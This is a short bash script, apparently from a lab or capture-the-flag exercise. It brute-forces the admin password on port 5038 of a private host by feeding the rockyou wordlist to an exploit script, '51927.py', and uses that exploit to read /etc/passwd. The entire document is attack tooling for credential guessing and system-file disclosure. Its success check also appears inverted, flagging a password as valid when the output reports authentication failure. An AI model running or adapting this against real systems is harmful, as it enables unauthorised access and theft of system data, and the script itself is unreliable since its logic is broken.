#!/bin/bash

while read -r pass;do
        output=$(python3 51927.py -p 5038 -u admin -P "$pass" -f /etc/passwd 10.201.85.4)
        if ! echo $output | grep -qiE "invalid|authentication failed"; then
                continue
        else
                echo "Valid pass: $pass"
                echo "$output"
                exit 0
        fi
done < /usr/share/wordlists/rockyou.txt
